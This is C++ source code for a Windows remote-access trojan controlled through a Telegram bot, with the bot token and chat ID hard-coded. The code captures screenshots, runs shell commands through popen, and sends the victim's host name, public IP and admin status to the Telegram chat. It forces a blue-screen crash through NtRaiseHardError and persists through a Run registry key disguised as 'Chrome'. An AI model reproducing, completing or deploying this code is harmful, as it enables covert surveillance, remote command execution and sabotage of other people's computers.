#include <iostream>
#include <string>
#include <fstream>
#include <windows.h>
#include <mmdeviceapi.h>
#include <endpointvolume.h>
#include <vector>
#include <atlimage.h>
#include <winternl.h>
#include <winsock.h>
#include <iomanip>
#include <nlohmann/json.hpp>
#include <cpr/cpr.h>
#pragma comment(lib, "Shlwapi.lib")

using namespace std;
using json = nlohmann::json;

string ID;
const string botApi = "1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664"; //https://api.telegram.org/bot1799119274:AAFMecQgld8WXiPUu8_dHKWa_-qJFOkC664/getUpdates
const string chat_id = "-1001487776950";
time_t uptime_start;

inline bool filexits(const string& name) {
    struct stat buffer;
    return (stat(name.c_str(), &buffer) == 0);
}

json GetLastMessage()
{
    auto response = cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/getUpdates?last=1&offset=-1" });
    string s = response.text;
    s = s.substr(21, s.size() - 23);
    if (s.empty()) {
        json jd;
        jd["message_id"] = 69;
        jd["date"] = -1;
        return jd;
    }
    json j = json::parse(s);
    j = j["channel_post"];
    return j;
}

bool ChangeVolume(double nVolume, bool bScalar)
{

    HRESULT hr = 0;
    bool decibels = false;
    bool scalar = false;
    double newVolume = nVolume;

    auto j = CoInitialize(NULL);
    IMMDeviceEnumerator* deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
        __uuidof(IMMDeviceEnumerator), (LPVOID*)&deviceEnumerator);
    IMMDevice* defaultDevice = NULL;

    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    deviceEnumerator = NULL;

    IAudioEndpointVolume* endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
        CLSCTX_INPROC_SERVER, NULL, (LPVOID*)&endpointVolume);
    defaultDevice->Release();
    defaultDevice = NULL;

    float currentVolume = 0;
    endpointVolume->GetMasterVolumeLevel(&currentVolume);

    hr = endpointVolume->GetMasterVolumeLevelScalar(&currentVolume);

    if (bScalar == false)
    {
        hr = endpointVolume->SetMasterVolumeLevel((float)newVolume, NULL);
    }
    else if (bScalar == true)
    {
        hr = endpointVolume->SetMasterVolumeLevelScalar((float)newVolume, NULL);
    }
    endpointVolume->Release();

    CoUninitialize();

    return FALSE;
}

void setID(string newID)
{
    ID = newID;
    fstream file;
    file.open("ID.id", ios::out);
    file << newID;
    file.close();
}

inline void press(char a)
{
    keybd_event(VkKeyScan(a), 1, 0, 0);
    Sleep(5);
    keybd_event(VkKeyScan(a), 1, KEYEVENTF_KEYUP, 0);
}


void TakeScreenShot(const std::string& path)
{
    //setting to the screen shot
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | 0, 0);
    Sleep(5);
    keybd_event(VK_LWIN, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);
    keybd_event(VK_SNAPSHOT, 0x45, KEYEVENTF_EXTENDEDKEY | KEYEVENTF_KEYUP, 0);

    //handler of the bitmap that save the screen shot
    HBITMAP hBitmap;

    //I have to give for it time to make it work
    Sleep(500);

    //take the screen shot
    OpenClipboard(NULL);

    //save the screen shot in the bitmap handler 
    hBitmap = (HBITMAP)GetClipboardData(CF_BITMAP);
    CloseClipboard();

    std::vector<BYTE> buf;
    IStream* stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    // screenshot to jpg and save to stream
    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buf.resize(len);
    IStream_Read(stream, &buf[0], len);
    stream->Release();

    // put the imapge in the file
    std::fstream fi;
    fi.open(path, std::fstream::binary | std::fstream::out);
    fi.write(reinterpret_cast<const char*>(&buf[0]), buf.size() * sizeof(BYTE));
    fi.close();
}

void crash() {

    typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
    typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle("ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

string get_exe() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    TCHAR* out;
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    out = PathFindFileName(buffer);
    return out;
}

string get_path() {
    //https://stackoverflow.com/questions/10814934/how-can-program-get-executable-name-of-itself
    TCHAR buffer[MAX_PATH] = { 0 };
    DWORD bufSize = sizeof(buffer) / sizeof(*buffer);
    GetModuleFileName(NULL, buffer, bufSize);
    
    return buffer;
}

//https://stackoverflow.com/questions/154536/encode-decode-urls-in-c
string url_encode(const string& value) {
    ostringstream escaped;
    escaped.fill('0');
    escaped << hex;

    for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
        string::value_type c = (*i);

        // Keep alphanumeric and other accepted characters intact
        if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
            escaped << c;
            continue;
        }

        // Any other characters are percent-encoded
        escaped << uppercase;
        escaped << '%' << setw(2) << int((unsigned char)c);
        escaped << nouppercase;
    }

    return escaped.str();
}

void Send(string to_send) {
    cpr::Get(cpr::Url{ "https://api.telegram.org/bot" + botApi + "/sendMessage?chat_id=" + chat_id + "&text=" + url_encode(to_send)});
}

string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
        result += buffer.data();
    }
    return result;
}

BOOL IsProcessElevated()
{
    BOOL fIsElevated = FALSE;
    HANDLE hToken = NULL;
    TOKEN_ELEVATION elevation;
    DWORD dwSize;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
    {
        printf("\n Failed to get Process Token :%d.", GetLastError());
        goto Cleanup;  // if Failed, we treat as False
    }


    if (!GetTokenInformation(hToken, TokenElevation, &elevation, sizeof(elevation), &dwSize))
    {
        printf("\nFailed to get Token Information :%d.", GetLastError());
        goto Cleanup;// if Failed, we treat as False
    }

    fIsElevated = elevation.TokenIsElevated;

Cleanup:
    if (hToken)
    {
        CloseHandle(hToken);
        hToken = NULL;
    }
    return fIsElevated;
}

string getStatus() {
    string status;

    int uptime_h = (time(nullptr) - uptime_start)/CLOCKS_PER_SEC/3600;
    int uptime_m = ((time(nullptr) - uptime_start) / CLOCKS_PER_SEC)/60;
    uptime_m -= uptime_h * 60;
    if (uptime_m < 0)uptime_m = 0;
    
    status = "uptime: " + to_string(uptime_h) + "h" + to_string(uptime_m) + "m" + '\n';
    status += "exe_name: " + get_exe() + '\n';
    string buffer = exec("hostname");
    buffer[buffer.size() - 1] = ' ';
    status += "host_name: " + buffer + '\n';
    auto response = cpr::Get(cpr::Url{ "https://myexternalip.com/raw" });
    status += "public_ip: " + response.text + '\n';
    status += "admin_rights: " + to_string(IsProcessElevated());
    
    cout << status << endl;
    return status;
}

void autostart() {
    string path;
    char username[256 + 1];
    DWORD username_len = 256 + 1;
    GetUserName(username, &username_len);

    char letter[256 + 1];
    GetSystemDirectory(letter, sizeof(letter));

    path = letter[0];
    path += ":\\Users\\" + (string)username + "\\AppData\\Local\\Temp";
    if (!filexits(path +"\\"+ get_exe())) {
        fstream file;
        file.open("o.bat", ios::out);
        file << "TASKKILL /F /IM " << get_exe() << endl
            << "move " << get_exe() << " %temp%" << endl
            << "start %temp%\\" + get_exe();
        file.close();
        string cmd = "Reg Add  HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Chrome /t REG_SZ /d %temp%\\" + get_exe();
        system(cmd.c_str());

        char buffer[MAX_PATH];
        ::GetModuleFileNameA(NULL, buffer, MAX_PATH);
        string buff2(buffer);
        buff2.erase(get_exe().size() - get_exe().size(), 256);
        cout << "jd";
        cout << buff2;
        file.open(path+"\\shitoo");
        file << buff2 + "o.bat";
        file.close();
      //  system("o.bat");
    }
    if (filexits(path+"\\shitoo")) {
        fstream file;
        string path2;
        file.open("shitoo");
        file >> path2;
        file.close();
        path2 += "\\o.bat";
        remove(path.c_str());
        remove("shitoo");
    }
}
